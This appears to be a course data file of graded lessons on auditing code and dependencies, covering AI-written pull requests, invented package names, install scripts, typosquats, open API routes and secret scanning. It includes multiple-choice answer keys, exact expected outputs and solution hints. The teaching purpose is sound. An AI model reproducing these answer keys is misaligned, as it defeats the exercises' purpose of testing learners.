      { concept: 'reviewing-ai-code', kind: 'mc', q: 'The assistant wrote this and it works for `average([2, 4])`. What does `average([])` do?', code: 'function average(nums) {\n  return nums.reduce((a, b) => a + b) / nums.length\n}', options: ['Returns 0', 'Returns NaN', 'Throws TypeError: Reduce of empty array with no initial value', 'Returns undefined'], answer: 2, why: '`reduce` with no starting value throws on an empty array. Passing the given example does not prove the code handles every input, so try the edges.' },
      { concept: 'package-hallucination', kind: 'mc', q: 'The assistant\'s code has `require(\'fast-trail-utils\')`, but package.json does not list it. What do you do first?', options: ['Run `npm install fast-trail-utils` straight away', 'Check the package exists and is trustworthy (npm view: age, maintainer, repository) before installing it', 'Delete package.json so the error goes away', 'Assume it is safe, since the assistant chose it'], answer: 1, why: 'The name may not exist, or may have been published by someone malicious. Look it up first.' },
      { concept: 'package-hallucination', kind: 'mc', q: 'Why is installing a package name an assistant invented a security risk?', options: ['Packages with invented names always run slower', 'npm refuses every name that has not been published before', 'Someone may have published a malicious package under that name, and its install scripts run on your machine', 'It changes your Node version'], answer: 2, why: 'Anyone can publish an unused name on npm. Installing it can run their install script.' },
      { concept: 'reviewing-ai-code', kind: 'type', q: 'Type the git command that lists the files that changed and how many lines each one gained and lost, before you read every line.', accept: ['git diff --stat', 'git diff --stat '], why: '`git diff --stat` is a summary: which files changed and by how much.' },
    ],
  },

  // ───── Code reading ─────
  {
    id: 'K-read', type: 'read', mode: 'phone', xp: 30, mins: 20,
    title: 'Read the route: an AI-written pull request',
    uses: ['claims-evidence', 'dependency-audit', 'architecture-review', 'cost-analysis', 'ai-coding-assistant', 'reviewing-ai-code', 'package-hallucination'],
    intro: 'An AI assistant wrote `forecast.js` for a pull request titled "Add caching and retries to the wind forecast". It looks tidy and the tests pass. You are the reviewer. The comment on line 2 is a copy of the project\'s `package.json` dependency list. Read the code like someone who has to sign it off. Read it for what it **does** and **why each part is there**, not to work out numbers.',
    file: { name: 'forecast.js', lang: 'js', code: `// forecast.js: PR #42 "Add caching and retries to the wind forecast" (written by an AI assistant)
// package.json dependencies: dayjs, express
const dayjs = require('dayjs')
const { smoothSeries } = require('wind-smooth-pro')

const FORECAST_URL = 'https://api.example.com/v1/wind'
const API_KEY = process.env.FORECAST_KEY
const CACHE_MINUTES = 10
const MAX_TRIES = 3
const LIMIT_KPH = 50

const cache = new Map()

function cacheKey(site) {
  return site.trim().toLowerCase()
}

// Returns saved readings that are still fresh, or null.
function getCached(site) {
  const hit = cache.get(cacheKey(site))
  if (!hit) return null
  if (dayjs().diff(hit.savedAt, 'minute') >= CACHE_MINUTES) return null
  return hit.readings
}

async function fetchOnce(site) {
  const res = await fetch(FORECAST_URL + '?site=' + encodeURIComponent(site), {
    headers: { Authorization: 'Bearer ' + API_KEY },
  })
  const data = await res.json()
  return data.readings
}

// Tries the API up to MAX_TRIES times and remembers a good answer.
async function fetchReadings(site) {
  const cached = getCached(site)
  if (cached) return cached

  let lastError
  for (let attempt = 1; attempt <= MAX_TRIES; attempt++) {
    try {
      const readings = await fetchOnce(site)
      cache.set(cacheKey(site), { readings, savedAt: dayjs() })
      return readings
    } catch (err) {
      lastError = err
      console.log('Attempt ' + attempt + ' failed: ' + err.message)
    }
  }
  throw lastError
}

// Average of the smoothed hourly wind readings, in km/h.
function averageWind(readings) {
  const smooth = smoothSeries(readings)
  const total = smooth.reduce((sum, r) => sum + r, 0)
  return total / smooth.length
}

async function summitCall(site) {
  const readings = await fetchReadings(site)
  if (!readings || readings.length === 0) return 'NO DATA'

  const avg = averageWind(readings)
  return avg <= LIMIT_KPH ? 'GO' : 'HOLD'
}

module.exports = { summitCall, fetchReadings }` },
    questions: [
      { concept: "reviewing-ai-code", kind: 'mc', q: "In one sentence, what does `forecast.js` do?", options: ["It forecasts the weather itself from wind records of past years","It draws a wind chart for each site","It sends an alert whenever the wind goes over the limit","It fetches wind readings for a site, reusing recent ones and retrying after failures, then says GO, HOLD or NO DATA for a summit attempt"], answer: 3, why: "Follow `summitCall`: get readings (cached, with retries), then decide. The title of the PR names the same two additions." },
      { concept: "cost-analysis", kind: 'mc', q: "Explain `getCached` (lines 19 to 24) in plain English.", options: ["It saves new readings for a site","It deletes every reading that is older than the limit","It returns the saved readings for a site if they were saved recently enough, otherwise nothing, so a fresh request is made","It returns the oldest readings it has for a site"], answer: 2, why: "No entry means null, and an entry older than the cache time also means null. Otherwise the saved readings are reused." },
      { concept: "architecture-review", kind: 'mc', q: "Explain `fetchReadings` (lines 35 to 51) in plain English.", options: ["It asks the service once and saves whatever comes back","It uses fresh saved readings if there are any. Otherwise it asks the service, saves a good answer, and tries again after a failure until it runs out of tries, then gives up with the last error","It asks the service as many times as it takes until one try works","It clears the cache and then asks the service for new readings"], answer: 1, why: "The cache check comes first, then the loop of tries. It only throws after every try has failed." },
      { concept: "reviewing-ai-code", kind: 'mc', q: "The forecast service answers with an error status and a body with no readings. What does the climber's call say, and what does that show about the retries?", options: ["NO DATA straight away: nothing treats an error status as a failure, so the retry loop never gets to retry","HOLD after every try has failed","GO, because no readings means no wind","The program crashes with the service's error message"], answer: 0, why: "`fetchOnce` never looks at `res.ok`. Only a thrown error, such as the network being down, reaches the `catch` on line 45." },
      { concept: "ai-coding-assistant", kind: 'mc', q: "Explain `summitCall` (lines 60 to 66) in plain English.", options: ["It always answers GO unless the service fails","It saves the readings and returns their average","It returns the readings so the caller decides","It gets the readings and says NO DATA if there are none. Otherwise it answers GO when the average wind is within the limit and HOLD when it is above"], answer: 3, why: "Line 62 guards the empty case, then line 65 compares the average with the limit." },
      { concept: "architecture-review", kind: 'mc', q: "`summitCall` runs with an empty cache. In what order do the functions run?", options: ["`getCached`, then `averageWind`, then `fetchOnce`","`fetchOnce`, then `getCached`, then `fetchReadings`","`fetchReadings`, then `getCached` (nothing found), then `fetchOnce`, then `averageWind`","`averageWind` first, because it only needs the site name"], answer: 2, why: "Each function calls the next one down. The average is only worked out after readings are in hand." },
      { concept: "claims-evidence", kind: 'mc', q: "The PR title promises retries. Which part of the code is the evidence?", options: ["The cache on lines 12 to 24","The loop in `fetchReadings` that tries again after a failure, up to `MAX_TRIES`","The `try` in `summitCall`","The constant `MAX_TRIES` on its own"], answer: 1, why: "A claim needs code that does it. The `for` and `catch` on lines 40 to 49 are the retry; a constant by itself does nothing." },
      { concept: "package-hallucination", kind: 'mc', q: "Line 4 requires `wind-smooth-pro`, but line 2 lists only `dayjs` and `express`. What should the reviewer do?", options: ["Treat it as suspicious: check the package really exists, is trusted and maintained, and is added to the dependency list before approving","Approve it, because the tests pass so the package must exist","Add it to line 2 so the comment matches, and move on","Ask the AI assistant to confirm that it exists"], answer: 0, why: "AI tools sometimes invent package names. A name that is not in the project's own list needs checking on the registry first. The assistant's own answer is not evidence." },
    ],
  },

  // ───────────────────────────── Drills, build, checks ─────────────────────────────
  {
    id: 'K-7', type: 'code', mode: 'phone', xp: 45, mins: 25,
    title: 'Ice-axe drill: the dependency flagger',
    uses: ['dependency-audit', 'package-json'],
    prompt: "Audit another project, **summit-chat**. Read its `package.json` and flag risks:\n• a script named `preinstall`, `install` or `postinstall` → `RISK install script: <name>`\n• a version of `*` or `latest` → `RISK unpinned: <name>@<version>`\n• a name in `LOOKALIKES` → `RISK typosquat? <name> looks like <real>`\n• a version starting with `github:` or `git+` → `RISK not from the registry: <name>`\n\nCheck scripts first, then dependencies in file order. Finish with `Risks found: N`.\n\nExpected output:\n`RISK install script: preinstall`\n`RISK unpinned: chalk@latest`\n`RISK typosquat? expresss looks like express`\n`RISK not from the registry: summit-helpers`\n`Risks found: 4`\n\nAlso write `depRisk(name, version)`, which returns the RISK text for one dependency, or `null` if it's fine.",
    starter: 'const fs = require("fs")\nconst LOOKALIKES = { expresss: "express", crossenv: "cross-env", loadsh: "lodash" }\nconst INSTALL_SCRIPTS = ["preinstall", "install", "postinstall"]\n\nfunction depRisk(name, version) {\n  // return the RISK text for this dependency, or null\n}\n\nconst pkg = JSON.parse(fs.readFileSync("package.json", "utf8"))\n// 1. scripts\n// 2. dependencies (Object.entries gives [name, version] pairs)\n// 3. Risks found: N\n',
    files: { 'package.json': '{\n  "name": "summit-chat",\n  "version": "0.9.1",\n  "scripts": {\n    "start": "node index.js",\n    "test": "vitest",\n    "preinstall": "node tools/fetch-helper.js"\n  },\n  "dependencies": {\n    "axios": "^1.7.9",\n    "chalk": "latest",\n    "expresss": "^4.21.2",\n    "dotenv": "^16.4.7",\n    "summit-helpers": "github:summit-chat/summit-helpers"\n  }\n}\n' },
    expect: ['RISK install script: preinstall', 'RISK unpinned: chalk@latest', 'RISK typosquat? expresss looks like express', 'RISK not from the registry: summit-helpers', 'Risks found: 4'],
    checks: [
      { expr: 'depRisk("lodash", "*")', equals: 'RISK unpinned: lodash@*', label: 'depRisk flags `*`' },
      { expr: 'depRisk("loadsh", "^4.17.21")', equals: 'RISK typosquat? loadsh looks like lodash', label: 'depRisk flags a look-alike' },
      { expr: 'depRisk("dayjs", "git+https://code.example/dayjs.git")', equals: 'RISK not from the registry: dayjs', label: 'depRisk flags a git URL' },
      { expr: 'depRisk("dayjs", "^1.11.13")', equals: null, label: 'depRisk returns null for a normal dependency' },
    ],
    hints: [
      'In depRisk, check in order: `if (version === "*" || version === "latest") return "RISK unpinned: " + name + "@" + version`, then `if (LOOKALIKES[name]) return …`, then `version.startsWith("github:") || version.startsWith("git+")`. Finish with `return null`.',
      'Scripts: `for (const name of Object.keys(pkg.scripts)) if (INSTALL_SCRIPTS.includes(name)) { console.log("RISK install script: " + name); count++ }`.',
      'Dependencies: `for (const [name, version] of Object.entries(pkg.dependencies)) { const r = depRisk(name, version); if (r) { console.log(r); count++ } }`.',
    ],
    file: 'campK/dep-flagger.js',
  },
  {
    id: 'K-8', type: 'code', mode: 'phone', xp: 45, mins: 25,
    title: 'Ice-axe drill: find routes with no login',
    uses: ['threat-model', 'http-methods-basics'],
    prompt: "Threat-model TrailPost's API. `routes.json` lists every entry point: `{ method, path, auth }` (`auth: true` means a login is required).\n\nWrite `classify(route)`:\n• no login AND the path starts with `/admin` → `\"elevation of privilege\"`\n• otherwise, no login AND the method isn't GET (it changes data) → `\"tampering\"`\n• anything else → `null`\n\nThen print exactly:\n`Entry points: 6`\n`Public: 4, login required: 2`\n`HIGH tampering: DELETE /trips/:id has no login`\n`HIGH elevation of privilege: GET /admin/export has no login`\n`HIGH tampering: POST /upload has no login`\n`Findings: 3`",
    starter: 'const fs = require("fs")\nconst routes = JSON.parse(fs.readFileSync("routes.json", "utf8"))\n\nfunction classify(route) {\n  // "elevation of privilege", "tampering" or null\n}\n\n// print the counts, then one HIGH line per risky route, then Findings: N\n',
    files: { 'routes.json': '[\n  { "method": "GET", "path": "/trips", "auth": false },\n  { "method": "POST", "path": "/trips", "auth": true },\n  { "method": "DELETE", "path": "/trips/:id", "auth": false },\n  { "method": "GET", "path": "/admin/export", "auth": false },\n  { "method": "PUT", "path": "/profile", "auth": true },\n  { "method": "POST", "path": "/upload", "auth": false }\n]\n' },
    expect: ['Entry points: 6', 'Public: 4, login required: 2', 'HIGH tampering: DELETE /trips/:id has no login', 'HIGH elevation of privilege: GET /admin/export has no login', 'HIGH tampering: POST /upload has no login', 'Findings: 3'],
    checks: [
      { expr: 'classify({ method: "PATCH", path: "/trips/7", auth: false })', equals: 'tampering', label: 'An unauthenticated PATCH is tampering' },
      { expr: 'classify({ method: "GET", path: "/admin/users", auth: false })', equals: 'elevation of privilege', label: 'An open admin route is elevation of privilege' },
      { expr: 'classify({ method: "DELETE", path: "/admin/users/7", auth: true })', equals: null, label: 'A route behind a login is not flagged' },
      { expr: 'classify({ method: "GET", path: "/trips", auth: false })', equals: null, label: 'A public read is not flagged' },
    ],
    hints: [
      'Start classify with `if (route.auth) return null`. Then `if (route.path.startsWith("/admin")) return "elevation of privilege"`, then `if (route.method !== "GET") return "tampering"`, then `return null`.',
      'Counts: `const open = routes.filter(r => !r.auth).length`, and login-required is `routes.length - open`.',
      'Findings: `for (const r of routes) { const kind = classify(r); if (kind) { console.log("HIGH " + kind + ": " + r.method + " " + r.path + " has no login"); findings++ } }`.',
    ],
    file: 'campK/open-doors.js',
  },
  {
    id: 'K-9', type: 'code', mode: 'phone', xp: 45, mins: 25,
    title: 'Ice-axe drill: the health check',
    uses: ['repo-health'],
    prompt: "TrailPost depends on **trail-utils**. `repo.json` holds its repository stats. Today is `2026-06-01`. One warning per rule:\n• more than 365 days since the last commit → `WARN no commits for N days`\n• more than half the issues still open → `WARN P% of issues are still open` (P = open ÷ (open + closed) × 100, rounded)\n• exactly 1 contributor → `WARN bus factor 1`\n• no licence → `WARN no licence`\n• no tests → `WARN no tests`\n\nThen `Health: S/5` (S = 5 minus the number of warnings) and `Verdict: V`, where V is `HEALTHY` for 4–5, `WATCH` for 2–3, and `AVOID` for 0–1.\n\nExpected output:\n`WARN no commits for 1156 days`\n`WARN 85% of issues are still open`\n`WARN bus factor 1`\n`WARN no licence`\n`WARN no tests`\n`Health: 0/5`\n`Verdict: AVOID`\n\nAlso write `openShare(open, closed)` (the rounded percentage) and `verdictFor(score)`.",
    starter: 'const fs = require("fs")\nconst repo = JSON.parse(fs.readFileSync("repo.json", "utf8"))\nconst TODAY = "2026-06-01"\n\n// Given: whole days between two "YYYY-MM-DD" dates\nfunction daysBetween(from, to) {\n  return Math.round((new Date(to) - new Date(from)) / 86400000)\n}\n\nfunction openShare(open, closed) {\n  // percentage of issues still open, rounded to a whole number\n}\n\nfunction verdictFor(score) {\n  // HEALTHY (4-5), WATCH (2-3), AVOID (0-1)\n}\n\nlet warnings = 0\n// one rule at a time: print the WARN line and count it\n',
    files: { 'repo.json': '{\n  "name": "trail-utils",\n  "lastCommit": "2023-04-02",\n  "openIssues": 212,\n  "closedIssues": 38,\n  "contributors": 1,\n  "hasLicense": false,\n  "hasTests": false\n}\n' },
    expect: ['WARN no commits for 1156 days', 'WARN 85% of issues are still open', 'WARN bus factor 1', 'WARN no licence', 'WARN no tests', 'Health: 0/5', 'Verdict: AVOID'],
    checks: [
      { expr: 'openShare(10, 30)', equals: 25, label: 'openShare(10, 30) is 25' },
      { expr: 'verdictFor(5)', equals: 'HEALTHY', label: 'verdictFor(5) is HEALTHY' },
      { expr: 'verdictFor(2)', equals: 'WATCH', label: 'verdictFor(2) is WATCH' },
      { expr: 'verdictFor(1)', equals: 'AVOID', label: 'verdictFor(1) is AVOID' },
    ],
    hints: [
      '`return Math.round(open / (open + closed) * 100)`',
      'verdictFor: `if (score >= 4) return "HEALTHY"`, then `if (score >= 2) return "WATCH"`, then `return "AVOID"`.',
      'First rule: `const days = daysBetween(repo.lastCommit, TODAY)`, then `if (days > 365) { console.log("WARN no commits for " + days + " days"); warnings++ }`. The others follow the same shape; the end is `const score = 5 - warnings`.',
    ],
    file: 'campK/health-check.js',
  },
  {
    id: 'K-10', type: 'keyboard', mode: 'keyboard', engine: 'code', xp: 150, mins: 150,
    title: 'Camp build: the audit kit',
    uses: ['audit-method', 'dependency-audit', 'secret-scan', 'privacy-audit', 'claims-evidence', 'audit-report', 'modules', 'json-parse-stringify'],
    prompt: "Build a reusable **audit kit**: one script that reads a project and prints a structured report with severities and a verdict. Your files: `package.json`, `README.md`, `src/server.js`, `config.json`, plus a helper module `known.js` that exports `lookalike(name)` (returns the popular package a name imitates, or `null`).\n\n**Each finding is an object** `{ severity, text }`, with severity `\"HIGH\"`, `\"MEDIUM\"` or `\"LOW\"`. Write these functions, each returning an array of findings:\n• `checkScripts(pkg)`: each script named `preinstall`, `install` or `postinstall` → HIGH `Install script \"<name>\" runs: <command>`\n• `checkDeps(pkg)`: for each dependency, in order: a look-alike name → HIGH `Possible typosquat: <name> looks like <real>`; a version of `*` or `latest` → MEDIUM `Unpinned version: <name>@<version>`\n• `findSecrets(text, file)`: each line matching the secret pattern → HIGH `Hard-coded secret in <file> line <n>`\n• `checkConfig(cfg)`: `debug` is true → MEDIUM `Debug mode is on in config.json`; `logRetentionDays` over 90 → MEDIUM `Logs kept for <n> days (limit 90)`\n• `checkClaims(readme)`: each README line starting with `- ` that contains a number followed by `x` or `%` → LOW `Claim needs evidence: \"<line without the dash>\"`\n\nAnd `verdict(findings)`: any HIGH → `DO NOT ADOPT`; else any MEDIUM → `ADOPT WITH FIXES`; else `ADOPT`.\n\nRun the checks in that order, then print **HIGH findings first, then MEDIUM, then LOW** (keeping their order inside each group). **The output must be exactly:**\n`AUDIT REPORT: trailpost 2.3.0`\n`Files checked: 4`\n`[HIGH] Install script \"postinstall\" runs: node scripts/setup.js`\n`[HIGH] Possible typosquat: crossenv looks like cross-env`\n`[HIGH] Hard-coded secret in src/server.js line 4`\n`[HIGH] Hard-coded secret in src/server.js line 5`\n`[MEDIUM] Unpinned version: trail-utils@*`\n`[MEDIUM] Debug mode is on in config.json`\n`[MEDIUM] Logs kept for 3650 days (limit 90)`\n`[LOW] Claim needs evidence: \"100% private: your data never leaves your device\"`\n`[LOW] Claim needs evidence: \"10x faster than other trip apps (see BENCHMARKS.md)\"`\n`Summary: 4 high, 3 medium, 2 low`\n`Verdict: DO NOT ADOPT`\n\nThe Sherpa also tests your functions on other projects, so no hard-coding. The plan is in the starter: build one function at a time and press Run after each.",
    starter: '// AUDIT KIT\n// GOAL:  read a project, print findings by severity, then a verdict\n// IN:    package.json, README.md, src/server.js, config.json (+ known.js helper)\n// OUT:   header, findings (HIGH, MEDIUM, LOW), summary, verdict (see the brief)\n// RULE:  read-only. Never print a secret\'s value.\n\nconst fs = require("fs")\nconst { lookalike } = require("./known")\n\nconst SECRET = /(password|secret|key|token)\\w*\\s*=\\s*["\']/i\nconst INSTALL_SCRIPTS = ["preinstall", "install", "postinstall"]\n\nfunction checkScripts(pkg) {\n  const found = []\n  // for each script name in pkg.scripts: if it\'s an install script,\n  // found.push({ severity: "HIGH", text: ... })\n  return found\n}\n\nfunction checkDeps(pkg) {\n  const found = []\n  // for each [name, version] of pkg.dependencies: lookalike? unpinned?\n  return found\n}\n\nfunction findSecrets(text, file) {\n  const found = []\n  // split into lines; for each matching line, push a HIGH finding with the line number\n  return found\n}\n\nfunction checkConfig(cfg) {\n  const found = []\n  // debug === true? logRetentionDays > 90?\n  return found\n}\n\nfunction checkClaims(readme) {\n  const found = []\n  // lines starting with "- " that match /\\d+(x|%)/\n  return found\n}\n\nfunction verdict(findings) {\n  // "DO NOT ADOPT", "ADOPT WITH FIXES" or "ADOPT"\n}\n\n// 1. read and parse the four files\n// 2. run the five checks in order, into one array\n// 3. print the header lines\n// 4. print HIGH, then MEDIUM, then LOW findings as "[SEVERITY] text"\n// 5. print the summary and the verdict\n',
    files: {
      'package.json': TP_PKG,
      'README.md': TP_README,
      'src/server.js': TP_SERVER,
      'config.json': '{\n  "port": 3000,\n  "debug": true,\n  "logRetentionDays": 3650\n}\n',
      'known.js': KNOWN_JS,
    },
    steps: [], // graded by `expect` and `checks`, not terminal steps
    expect: [
      'AUDIT REPORT: trailpost 2.3.0',
      'Files checked: 4',
      '[HIGH] Install script "postinstall" runs: node scripts/setup.js',
      '[HIGH] Possible typosquat: crossenv looks like cross-env',
      '[HIGH] Hard-coded secret in src/server.js line 4',
      '[HIGH] Hard-coded secret in src/server.js line 5',
      '[MEDIUM] Unpinned version: trail-utils@*',
      '[MEDIUM] Debug mode is on in config.json',
      '[MEDIUM] Logs kept for 3650 days (limit 90)',
      '[LOW] Claim needs evidence: "100% private: your data never leaves your device"',
      '[LOW] Claim needs evidence: "10x faster than other trip apps (see BENCHMARKS.md)"',
      'Summary: 4 high, 3 medium, 2 low',
      'Verdict: DO NOT ADOPT',
    ],
    checks: [
      { expr: 'checkScripts({ scripts: { test: "vitest", preinstall: "node x.js" } }).map(f => f.severity + " " + f.text)', equals: ['HIGH Install script "preinstall" runs: node x.js'], label: 'checkScripts works on another project' },
      { expr: 'checkDeps({ dependencies: { expres: "^4.0.0", dayjs: "latest", chalk: "^5.4.1" } }).map(f => f.severity + " " + f.text)', equals: ['HIGH Possible typosquat: expres looks like express', 'MEDIUM Unpinned version: dayjs@latest'], label: 'checkDeps works on another project' },
      { expr: 'findSecrets("const a = 1\\nconst apiToken = \'abc\'", "x.js").map(f => f.text)', equals: ['Hard-coded secret in x.js line 2'], label: 'findSecrets reports the right line' },
      { expr: 'checkConfig({ debug: false, logRetentionDays: 30 }).length', equals: 0, label: 'checkConfig passes a safe config' },
      { expr: 'checkClaims("# App\\n- 50% less code\\n- Easy to use\\n2x the fun").map(f => f.text)', equals: ['Claim needs evidence: "50% less code"'], label: 'checkClaims only flags bullet lines with numbers' },
      { expr: 'verdict([{ severity: "MEDIUM", text: "x" }, { severity: "LOW", text: "y" }])', equals: 'ADOPT WITH FIXES', label: 'verdict: MEDIUM means ADOPT WITH FIXES' },
      { expr: 'verdict([])', equals: 'ADOPT', label: 'verdict: nothing found means ADOPT' },
    ],
    hints: [
      'Start with step 1 and the header: `const pkg = JSON.parse(fs.readFileSync("package.json", "utf8"))`, the same for config.json; the README and server.js are plain text. Print `"AUDIT REPORT: " + pkg.name + " " + pkg.version` and `"Files checked: 4"`. Run it.',
      'checkScripts: `for (const [name, cmd] of Object.entries(pkg.scripts || {})) if (INSTALL_SCRIPTS.includes(name)) found.push({ severity: "HIGH", text: "Install script \\"" + name + "\\" runs: " + cmd })`. checkDeps is the same loop over `pkg.dependencies`, with `const real = lookalike(name)` and a check for `"*"` or `"latest"`.',
      'findSecrets: `text.split("\\n").forEach((line, i) => { if (SECRET.test(line)) found.push({ severity: "HIGH", text: "Hard-coded secret in " + file + " line " + (i + 1) }) })`. checkClaims: same loop, with `line.startsWith("- ") && /\\d+(x|%)/.test(line)`, and `line.slice(2)` drops the dash.',
      'Step 2: `const all = [...checkScripts(pkg), ...checkDeps(pkg), ...findSecrets(server, "src/server.js"), ...checkConfig(cfg), ...checkClaims(readme)]`. Step 4: `for (const sev of ["HIGH", "MEDIUM", "LOW"]) for (const f of all.filter(f => f.severity === sev)) console.log("[" + sev + "] " + f.text)`. Count each group with the same filter for the summary.',
    ],
  },
  {
    id: 'K-11', type: 'radio', mode: 'phone', xp: 40, mins: 10,
    title: 'Radio check: the order of an audit',
    uses: ['audit-method', 'claims-evidence', 'architecture-review', 'threat-model', 'audit-report'],
    prompt: 'From "should we use this?" to a written verdict: put the audit in order.',
    journal: true,
    sequence: [
      'Agree the question, the scope and a time box',
      'Read the claims: README, website, pitch',
      'Collect evidence read-only: files, history, dependencies',
      'Map the architecture and the data flows',
      'Model the threats: assets, attackers, entry points',
      'Rate each finding by impact and likelihood',
      'Write the report: summary first, then findings, then the verdict',
    ],
    blanks: {
      text: 'An audit starts with a ___. Every finding needs ___ that someone else can re-check. A finding\'s ___ comes from its impact and likelihood. The report puts the ___ first, and every finding ends with a ___.',
      answers: ['scope', 'evidence', 'severity', 'verdict', 'fix'],
      extra: ['budget', 'opinion', 'colour', 'appendix', 'apology'],
    },
  },
  {
    id: 'K-12', type: 'audit', mode: 'phone', xp: 35, mins: 20,
    title: 'Weather check: the "free forever" database',
    primer: [
      { h: 'A pitch is a list of claims', b: "Hosted services sell with big, short sentences. Each one is a claim to mark: SUPPORTED, CONTRADICTED or UNVERIFIED. The fine print is where the evidence usually lives, so read it as carefully as the headline." },
      { h: 'The five-minute vendor audit', b: "1. **Claims:** copy each one exactly. Spot weasel words: \"up to\", \"unlimited\", \"military-grade\".\n2. **Cost:** find the free limits and the price past them. What does it cost at 10× your usage? What's paid-only?\n3. **Benchmarks:** who ran them, against what, which runs?\n4. **Privacy:** where is the data stored, who else receives it, how long is it kept?\n5. **Exit and licence:** can you export your data? Is the software open source, source-available or closed?\n6. **Verdict:** ADOPT, ADOPT WITH FIXES (or with conditions), or DO NOT ADOPT, with the reason." },
    ],
    scenario: "Your club's next app needs a database. **PeakBase** (an invented service) advertises:\n\n**\"Free forever! Unlimited requests. 50× faster than the leading database. Military-grade encryption. Trusted by 10,000 developers.\"**\n\nThe fine print says: the free plan includes 500 MB of storage and 2 GB of data out per month, then $0.12 per GB of data out. Free projects are **paused after 7 days without activity**. Data export is available **on paid plans only**. The \"50×\" chart compares PeakBase's cached reads with the other database's first, uncached reads. The server software is **source-available**: you may read it, but not run it as a hosted service. Your data is stored in one region; its usage data is shared with \"analytics partners\".",
    questions: [
      { concept: 'claims-evidence', kind: 'mc', q: '"Unlimited requests", but the fine print caps storage and data out. How do you mark the "free forever" pitch overall?', options: ['Supported: requests are the main usage and they are unlimited, so it stays free', 'Contradicted in practice: real use hits paid limits quickly', 'Unverified: you\'d have to run the app for a month to know if it stays free', 'Irrelevant to the audit: pricing is the founder\'s business, not a technical finding'], answer: 1, why: 'Requests may be unlimited, but any real app also needs storage and data out, which aren\'t.' },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'The 50× chart compares cached reads with the rival\'s uncached reads. That is…', options: ['A fair test, as long as both bars use the same colours and the same scale', 'An apples-to-oranges comparison: warm vs cold, not like for like', 'Proof of 50×: the chart is based on measured numbers, so the claim holds up', 'Only a problem if the rival is open source, since closed tools can\'t be benchmarked fairly'], answer: 1, why: 'Same conditions for both sides, or the number means nothing.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Which fine-print item is the biggest hidden cost for a small club app?', options: ['The 2 GB data-out allowance, which is far more than a small club app will ever send', 'Export only on paid plans: leaving later means paying first (lock-in)', 'The price of the paid plan, which a club app will have to pay from the first day', 'The encryption standard in use, because stronger encryption makes the service cost more'], answer: 1, why: 'Exit cost decides whether you can ever leave. It never appears on the headline.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'The club app is used mostly in climbing season. Which rule bites in the quiet months?', options: ['The 500 MB storage cap, because stored data keeps growing even when nobody uses the app', 'Free projects pause after 7 days without activity', 'The data-out charge, which keeps billing you in quiet months even with little traffic', 'The source-available licence, which lapses if the app goes unused for a few months'], answer: 1, why: 'A paused database means a broken app when someone finally opens it.' },
      { concept: 'privacy-audit', kind: 'mc', q: 'Usage data is shared with "analytics partners". What does the auditor write?', options: ['Nothing: sharing with analytics partners is standard practice and covered by the policy', 'A finding: unnamed third parties receive data; ask which, what data, and how long it\'s kept', 'A legal violation: sharing with partners is illegal without consent, so flag it as unlawful', 'That it\'s anonymous and therefore fine, because analytics data never identifies anyone'], answer: 1, why: 'Name the flow and the open questions. Legal conclusions are for lawyers.' },
      { concept: 'license-check', kind: 'mc', q: 'The server software is source-available, "not for hosted services". Is it open source?', options: ['Yes: if the source code is public and anyone can read it, it counts as open source', 'No: readable, but use is restricted. Check the terms against your plans', 'Yes: any licence that lets you download and modify the code counts as open source', 'Yes, as long as the restriction only affects hosted services, which are a special case'], answer: 1, why: 'Visible code with restrictions is source-available, not open source.' },
      { concept: 'audit-method', kind: 'mc', q: 'Best verdict for the club?', options: ['ADOPT: the free tier covers a small club, and the issues found can be fixed later', 'DO NOT ADOPT as is: the pausing, lock-in and data sharing outweigh the free tier. Compare alternatives', 'ADOPT WITH NO CONDITIONS: 10,000 developers use it, so others have already checked it', 'NO VERDICT YET: an audit only lists findings, and the decision belongs to the club\'s committee'], answer: 1, why: 'A verdict is one clear call plus its reasons, drawn from the findings.' },
    ],
  },
  {
    id: 'K-13', type: 'audit', mode: 'phone', xp: 35, mins: 20,
    title: 'Weather check: the open-source tracker',
    primer: [
      { h: 'Good projects get audited too', b: "Audits aren't only for catching villains. Most projects you'll audit are honest, useful and imperfect. A fair auditor reports the good alongside the bad, rates each finding by real-world severity, and gives a verdict with conditions." },
      { h: 'Read severity in context', b: "A high-severity vulnerability in a tool that only runs on developers' machines is less urgent than a medium one in code every user touches. Telemetry (usage data sent home) that's on by default is a privacy finding, even when it's documented. And a licence that's fine for a hobby may not fit a closed-source product. Ask: **who is affected, how likely, how bad?**" },
    ],
    scenario: "Your team wants to self-host **StreakCairn** (invented), an open-source habit tracker, as part of a paid, closed-source coaching app you're building.\n\nYou find: **40 contributors**, a release 2 weeks ago, issues answered within days, a `SECURITY.md`, and tests that run on every change. The licence is **AGPL-3.0**, and you'd need to modify it. `npm audit` reports **1 high** vulnerability in a test tool listed only in devDependencies, and `npm audit --omit=dev` reports **0**. **Telemetry is on by default**: it sends usage counts and the server's address to the project's own server, documented in the README with an option to turn it off. The README says \"privacy-first\".",
    questions: [
      { concept: 'repo-health', kind: 'mc', q: 'How healthy is StreakCairn?', options: ['Unhealthy: it has a known vulnerability, and any vulnerability makes a project unhealthy', 'Healthy: many contributors, recent releases, answered issues, tests, a security policy', 'Mixed: the project looks active, but one high vulnerability means health can\'t be called good', 'Impossible to say without running it, since health can only be judged by performance tests'], answer: 1, why: 'Every health signal is good. Report positives honestly.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'The only high vulnerability is in a dev-only test tool, and `--omit=dev` shows 0. Fair severity for your report?', options: ['CRITICAL: a HIGH npm result must be treated as critical and blocks any adoption', 'LOW: it doesn\'t ship to users. Note it and update the tool', 'Ignore it completely: dev tools never reach users, so it doesn\'t belong in the report', 'HIGH, since npm rated it high and the tool\'s own rating is the final severity'], answer: 1, why: 'Context sets severity: who is affected, and how.' },
      { concept: 'license-check', kind: 'mc', q: 'You\'ll modify the AGPL code and run it inside your paid, closed-source web app. What\'s the licence finding?', options: ['LOW for your plan: AGPL is permissive, so you may modify it and keep your own code closed if the notice stays', 'HIGH for your plan: network users of the modified program must be offered its source, which clashes with closed source. Get proper advice', 'None: AGPL only applies if you hand copies to customers, and a web app only serves pages to them', 'Fine as long as you charge money: AGPL only restricts free products, and paid ones count as commercial'], answer: 1, why: 'The licence fits the project; it may not fit YOUR plan. That\'s the finding.' },
